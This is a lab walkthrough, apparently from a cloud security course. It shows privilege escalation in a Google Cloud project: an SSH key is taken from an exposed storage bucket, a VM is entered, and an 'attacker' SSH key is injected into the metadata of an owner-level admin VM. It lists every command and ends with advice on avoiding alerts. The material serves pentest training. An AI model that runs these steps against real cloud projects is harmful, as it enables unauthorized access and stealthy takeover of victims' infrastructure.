# Objective

We will find the credential for a low privileged virtual machine instance from the dev bucket. Then access other high privileged compute instances using the low privileged machine.

# Solution

**Step 1:** List out the content of the dev bucket, you compromised from the misconfigured storage bucket.

![](https://user-images.githubusercontent.com/54552051/204803801-bfa0ab6c-402b-4321-8342-71bd893941b0.png)

![](https://user-images.githubusercontent.com/54552051/204803856-29420dc8-6312-4afe-98bb-bc4332ed8b28.png)

In the bucket contents, you will find an interesting file named **config.txt** as highlighted in the above image. Copy the relative path for the file. There are some key files also in the same directory.

**Step 2:** Access the config.txt file using the relative path at the end of the bucket URL.

```
https://storage.googleapis.com/<DEV BUCKET NAME>/shared/files/.ssh/config.txt
```

![](https://user-images.githubusercontent.com/54552051/204803864-7e7c4f8d-6af7-4614-a6bc-36c5f3814a0a.png)

Here you will find multiple IPs with some users and their SSH key relative paths.

**Step 3:** Run the Nmap scan on the IP addresses using the below command.

```
nmap <IP_ADDR> -Pn
```

**Note:** Replace the IP_ADDR with the host IPs found in the config file.

![](https://user-images.githubusercontent.com/54552051/204803868-e501e087-61df-4033-9ad5-1f6a96fc8892.png)

One of the IP addresses will have port 22 open.

If you match this IP address in the config file, it will be for the user **justin**. 

![](https://user-images.githubusercontent.com/54552051/204803870-7ed420f1-be67-4a0e-a347-de85b600d0f0.png)

Copy the relative path for the SSH key.

**Step 4:** Download the SSH key onto your system and change the permissions of the file using chmod command.

```
wget https://storage.googleapis.com/<DEV BUCKET NAME>/shared/files/.ssh/keys/justin.pem

chmod 400 justin.pem
```

These commands will download the key file and change the permissions to read-only for the current user only.

![](https://user-images.githubusercontent.com/54552051/204803874-678a0170-9152-4191-b7bc-24d8deb14e44.png)

**Step 5:** Access the virtual machine using the ssh key just downloaded.

```
ssh -i justin.pem justin@<IP_ADDR>
```

**Note:** Replace IP_ADDR with the IP address corresponding to justin in the config file.

![](https://user-images.githubusercontent.com/54552051/204803878-4eddb718-37db-4863-adc0-81e6396607ae.png)

You will be successfully logged into the cloud virtual machine.

**Step 6:** Get the service account and project details using the below gcloud command.

```
gcloud config list
```

![](https://user-images.githubusercontent.com/54552051/204803879-4b98c341-2231-4afd-b4bc-bf7c2de7b6a7.png)

This VM seems to be using default compute service account. The default service account has **Editor** level access to the project. But often restricted by access scopes.

**Step 7:** Check access scope for the VM using metadata API.

```
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes \
    -H 'Metadata-Flavor:Google'
```

![](https://user-images.githubusercontent.com/54552051/204803882-2c67e546-f990-458e-a7bc-a3b92dd3713e.png)

We don't have full API access on the project, but we do have full access to compute services and read access for the buckets.

**Step 8:** List out all the compute instances inside the project.

```
gcloud compute instances list
```

![](https://user-images.githubusercontent.com/54552051/204803884-8393d6ac-8af2-4b34-bdc4-584fd4230027.png)

Here we have another VM inside the project named as **admin-vm**. Note down the public IP address for the admin VM.

We will access this VM by modifying its metadata.

**Step 9:** Create a new SSH key for a user **attacker** using the below command.

```
ssh-keygen -t rsa -C "attacker" -f ./key -P "" && cat ./key.pub
```

![](https://user-images.githubusercontent.com/54552051/204803886-c7f73a5e-e221-4c3b-a8d6-78ccff403085.png)

A public and private key pair will be created for a user attacker. The public key is in **key.pub** file and the private key is in **key** file.

**Step 10:** Create a meta.txt file consisting of the user and the public key for this user.

```
NEWKEY="$(cat ./key.pub)"
echo "attacker:$NEWKEY" > ./meta.txt
```

We are storing the public key in the **NEWKEY** variable and then adding the USER:KEY data to the meta.txt file.

![](https://user-images.githubusercontent.com/54552051/204803887-a64505ca-1f0f-4fbf-92f2-6882b3e50119.png)

You can check the meta.txt file using the **cat** command.

**Step 11:** Update the metadata of the admin-vm instance using the below command.

```
gcloud compute instances add-metadata admin-vm --metadata-from-file ssh-keys=meta.txt
```

This command will add the content of meta.txt in the **ssh-keys** section of the instance metadata.

![](https://user-images.githubusercontent.com/54552051/204803892-a0e84265-54a3-4833-a00d-1719e5f8bfa4.png)

Hit **Y** if asked for the zone of the instance.

**Step 12:** Verify the metadata is updated for the admin-vm instance using the below gcloud command.

```
gcloud compute instances describe admin-vm --zone us-west1-c
```

![](https://user-images.githubusercontent.com/54552051/204803895-167d63da-42a7-4bf6-8c61-a28f4e6ce93a.png)

![](https://user-images.githubusercontent.com/54552051/204803896-d619b6c8-832f-42f7-bdfd-cfef28a7da51.png)

There is a key added to the **ssh-keys** section for the attacker user. You can follow the same method to update the SSH keys of an existing user.

**Step 13:** Log in to the admin-vm using the newly created key.

```
ssh -i ./key attacker@<IP_ADDR>
```

**Note:** Replace the IP_ADDR with the public IP of admin-vm instance.

![](https://user-images.githubusercontent.com/54552051/204803902-d2fb6393-ce11-4ef7-9aa9-0f0e143c908d.png)

You will be successfully logged in to the admin-vm with the attacker user. By default, the user will have sudo access as it was added through the metadata of this instance.

**Step 14:** Check for the project name and service account attached to this VM using the below gcloud command.

```
gcloud config list
```

![](https://user-images.githubusercontent.com/54552051/204803906-c4406f82-89f3-478f-8b24-ae34ed8c9940.png)

A service account named **admin-service-account** is attached to this instance. Note down the project name.

**Step 15:** Get the IAM policy of the project to check the access of this service account using the below gcloud command.

```
gcloud projects get-iam-policy <PROJECT NAME>
```

**Note:** Replace the PROJECT NAME with the project id you got from previous step.

![](https://user-images.githubusercontent.com/54552051/204803909-45b0631b-2f5a-42f2-83c0-b1c5b322252c.png)

You can see that this service account has the **owner** role on this project.

**Step 16:** Check access scope for the VM using metadata API.

```
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes \
    -H 'Metadata-Flavor:Google'
```

![](https://user-images.githubusercontent.com/54552051/204803913-555e4ff9-5116-4bef-aeec-706975a318a3.png)

**cloud-platform** access scope means that we have full API access. This instance has full owner access over the project.


**Step 17:** Login to the admin-vm from the developer VM using a simple command.

```
gcloud compute ssh admin-vm
```

This command will add the current user to the admin-vm instance by modifying the metadata.

![](https://user-images.githubusercontent.com/54552051/204803915-5f6ab5c1-8246-4b3c-927a-c03fdc7f5097.png)

![](https://user-images.githubusercontent.com/54552051/204803920-1c4cb0a4-0755-42df-bbca-92b2227206fc.png)

You are now logged in to the admin-vm with user **justin**.

This method seems very easy but can trigger some alerts as a new user and ssh key are added to the VM. By using the previous method you can simply change the SSH keys of any existing user. Thus creating less noise in the environment.